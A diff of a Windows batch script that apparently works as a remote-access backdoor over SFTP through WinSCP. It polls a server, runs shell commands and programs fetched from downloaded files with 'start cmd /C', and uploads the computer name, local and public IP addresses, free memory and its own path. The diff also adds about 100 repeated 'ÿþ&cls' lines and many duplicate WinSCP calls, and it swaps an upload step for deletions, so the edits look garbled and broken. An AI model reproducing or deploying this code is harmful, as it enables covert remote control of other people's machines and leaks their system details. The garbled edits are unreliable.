@@ -1,3 +1,103 @@
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
+ÿþ&cls
 @ECHO OFF
 cls
 set username="unaux_27236823"
@@ -63,6 +163,10 @@ goto ping
 del /q send\*
 del /q receve\*
 "WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 echo %ComputerName%>send\dbug.unix
 "WinSCP.com" /script="sendattrib.tmp"
 del /q send\*
@@ -72,6 +176,9 @@ goto ping
 :tping
 del /q send\*
 del /q receve\*
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 "WinSCP.com" /script="delattrib.tmp"
 "WinSCP.com" /script="delattrib.tmp"
 echo .>send\tping.unix
@@ -85,6 +192,10 @@ goto ping
 :ipcnfg-pve
 del /q send\*
 del /q receve\*
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 "WinSCP.com" /script="delattrib.tmp"
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 echo %NetworkIP%>send\ipcnfg-pve.unix
@@ -102,6 +213,10 @@ goto ping
 del /q send\*
 del /q receve\*
 "WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 echo %PublicIP%>send\ipcnfg-pbc.unix
 "WinSCP.com" /script="sendattrib.tmp"
@@ -113,6 +228,10 @@ goto ping
 
 :shell
 del /q send\*
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 "WinSCP.com" /script="delattrib.tmp"
 set /p shell=<receve\shell.unix
 start cmd /C %shell%
@@ -127,6 +246,10 @@ goto ping
 
 :trun
 del /q send\*
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 "WinSCP.com" /script="delattrib.tmp"
 set /p trun=<receve\trun.unix
 start %trun%
@@ -143,6 +266,10 @@ goto ping
 del /q send\*
 del /q receve\*
 "WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 SET mypath=%~dp0
 echo %mypath:~0,-1%>send\tdir.unix
 "WinSCP.com" /script="sendattrib.tmp"
@@ -153,6 +280,10 @@ goto ping
 :off
 del /q send\*
 del /q receve\*
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 "WinSCP.com" /script="delattrib.tmp"
 echo .>send\off.unix
 "WinSCP.com" /script="sendattrib.tmp"
@@ -168,13 +299,21 @@ exit
 del /q send\*
 del /q receve\*
 "WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 for /f "skip=1" %%p in ('wmic os get freephysicalmemory') do ( 
   set m=%%p
   goto :getmemdone
 )
 :getmemdone
 echo %m%>send\getmem.unix
-"WinSCP.com" /script="sendattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 del send\getmem.unix
 del receve\getmem.unix
 goto ping
@@ -183,6 +322,10 @@ goto ping
 :rmoffunix
 del /q send\*
 del /q receve\*
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
+"WinSCP.com" /script="delattrib.tmp"
 "WinSCP.com" /script="delattrib.tmp"
 echo .>send\rmunix.unix
 "WinSCP.com" /script="sendattrib.tmp"
